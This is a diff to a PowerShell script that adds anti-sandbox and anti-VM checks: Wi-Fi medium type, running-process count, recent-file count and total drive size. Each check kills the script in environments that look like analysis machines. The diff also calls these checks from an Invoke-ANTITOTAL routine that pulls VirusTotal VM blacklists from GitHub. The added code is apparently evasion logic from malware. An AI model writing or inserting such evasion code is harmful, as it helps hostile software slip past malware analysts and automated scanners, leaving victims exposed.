@@ -15,6 +15,46 @@ function Search-IP {
     return $pc_ip
 }
 
+function Wifi-Check {
+    $wifi = Get-WmiObject -Namespace root/WMI -Class MSNdis_PhysicalMediumType | Select-Object -ExpandProperty NdisPhysicalMediumType
+    if ($wifi -eq 9) {
+        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('WIFI CHECK FAILED !', '', 'OK', 'Error')
+        Stop-Process $pid -Force
+    }
+}
+
+function ProcessCountCheck {
+    $processes = Get-Process | Measure-Object | Select-Object -ExpandProperty Count
+    if ($processes -lt 50) {
+        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('PROCESS COUNT CHECK FAILED !', '', 'OK', 'Error')
+        Stop-Process $pid -Force
+    }
+}
+
+function RecentFileActivity {
+    $file_Dir = "$ENV:APPDATA/microsoft/windows/recent"
+    $file = Get-ChildItem -Path $file_Dir
+    #if number of files is less than 20
+    if ($file.Count -lt 20) {
+        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
+        Stop-Process $pid -Force
+    }
+}
+
+function TestDriveSize {
+    $drives = Get-Volume | Where-Object { $_.DriveLetter -ne $null } | Select-Object -ExpandProperty DriveLetter
+    $driveSize = 0
+    foreach ($drive in $drives) {
+        $driveSize += (Get-Volume -DriveLetter $drive).Size
+    }
+    $driveSize = $driveSize / 1GB
+    if ($driveSize -lt 50) {
+        Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('DRIVE SIZE CHECK FAILED !', '', 'OK', 'Error')
+        Stop-Process $pid -Force
+    }
+
+}
+
 function Search-HWID {
     $hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
     return $hwid
@@ -26,6 +66,16 @@ function Search-Username {
 }
 
 function Invoke-ANTITOTAL {
+    $anti_functions = @(
+        "Wifi-Check",
+        "ProcessCountCheck",
+        "RecentFileActivity",
+        "TestDriveSize"
+    )
+
+    foreach ($func in $anti_functions) {
+        Invoke-Expression "$func"
+    }
     $urls = @(
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
         "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
